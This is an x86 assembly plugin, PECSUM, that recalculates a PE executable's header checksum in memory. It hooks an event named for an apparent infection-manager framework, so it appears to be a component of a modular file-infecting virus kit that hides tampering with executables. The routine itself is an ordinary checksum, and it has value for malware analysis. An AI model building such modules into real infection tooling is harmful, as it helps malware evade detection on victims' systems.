   ; PECSUM
   ; ~~~~~~
   ; - PE checksum recalculation -- without IMAGEHLP.DLL usage.
   ; - target: file in memory

   include                 INCLUDE\consts.inc
   include                 INCLUDE\mz.inc
   include                 INCLUDE\pe.inc
   include                 infmanx.inc

   include                 plugin.inc
                           PLUGIN_START    PECSUM, CODE32, PERMUTABLE

   handleevent:            hookevent EV_INFMANX_AFTER_FILE, recalc
                           stc
                           retn

   ; input: ESI/ECX=fileptr/size

   recalc:                 pusha

                           mov     ebx, esi
                           add     ebx, [ebx].mz_neptr

                           mov     [ebx].pe_checksum, 0    ; zero old checksum

                           call    calc_csum

                           mov     [ebx].pe_checksum, eax  ; set new checksum

                           popa
                           stc     ; event unhandled, all regs. saved
                           retn

   ; input:  ESI=data, ECX=size
   ; output: EAX=csum

   calc_csum:              pusha
                           mov     edi, ecx                ; this subroutine
                           xor     edx, edx                ; was ripped
                           shr     ecx, 1                  ; from PECSUM tool
   __cycle:                movzx   eax, word ptr [esi]     ; (  ª®£® ¥¡¥â?)
                           add     edx, eax
                           mov     eax, edx
                           movzx   edx, dx
                           shr     eax, 16
                           add     edx, eax
                           inc     esi
                           inc     esi
                           loop    __cycle
                           mov     eax, edx
                           shr     eax, 16
                           add     ax, dx
                           add     eax, edi
                           mov     [esp].popa_eax, eax
                           popa
                           ret

                           PLUGIN_END
